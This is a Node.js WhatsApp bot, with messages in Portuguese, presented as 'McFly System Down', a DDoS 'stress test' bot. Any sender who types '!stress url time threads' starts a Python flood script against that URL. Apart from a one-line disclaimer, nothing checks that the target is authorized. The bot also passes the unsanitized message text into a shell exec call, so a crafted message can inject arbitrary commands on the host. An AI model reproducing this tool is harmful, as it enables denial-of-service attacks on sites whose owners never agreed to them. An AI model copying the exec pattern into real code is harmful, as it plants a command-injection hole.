const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const qrcode = require('qrcode-terminal');
const { exec } = require('child_process');

async function connectToWhatsApp () {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys');
    const sock = makeWASocket({ auth: state });

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) {
            qrcode.generate(qr, { small: true });
        }
        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log('connection closed due to ', lastDisconnect?.error, ', reconnecting ', shouldReconnect);
            if(shouldReconnect) {
                connectToWhatsApp();
            }
        } else if(connection === 'open') {
            console.log('✅ Bot conectado no WhatsApp!');
        }
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const m = messages[0];
        if (!m.message) return;

        const sender = m.key.remoteJid;
        const msg = m.message.conversation || m.message.extendedTextMessage?.text;

        if (!msg) return;

        console.log(`📨 Mensagem recebida: ${msg}`);

        if (msg.startsWith('!start')) {
            await sock.sendMessage(sender, { text: 
`🔥 *McFly System Down*

👨‍💻 Sou um bot de testes de stress DDoS.

🛠️ *Comando disponível:*

!stress (url) (tempo-em-segundos) (quantidade-de-threads)

🧠 Exemplo:
!stress https://seusite.com 60 50

⚠️ *Uso exclusivo para testes em sites autorizados pela sua equipe.*`
            });
        }

        if (msg.startsWith('!stress')) {
            const partes = msg.split(' ');

            if (partes.length < 4) {
                await sock.sendMessage(sender, { text: 
`❌ Uso incorreto.

🛠️ Formato correto:
!stress (url) (tempo) (threads)

🧠 Exemplo:
!stress https://seusite.com 60 50`
                });
                return;
            }

            const url = partes[1];
            const tempo = partes[2];
            const threads = partes[3];

            await sock.sendMessage(sender, { text: `🚀 Ataque iniciado em ${url} por ${tempo}s usando ${threads} threads.` });

            // Executa o script Python
            exec(`python3 stress.py ${url} ${tempo} ${threads}`, (error, stdout, stderr) => {
                if (error) {
                    sock.sendMessage(sender, { text: `❌ Erro: ${error.message}` });
                    return;
                }
                if (stderr) {
                    sock.sendMessage(sender, { text: `⚠️ Aviso: ${stderr}` });
                    return;
                }
                sock.sendMessage(sender, { text: `✅ Ataque finalizado.` });
            });
        }
    });
}

connectToWhatsApp();
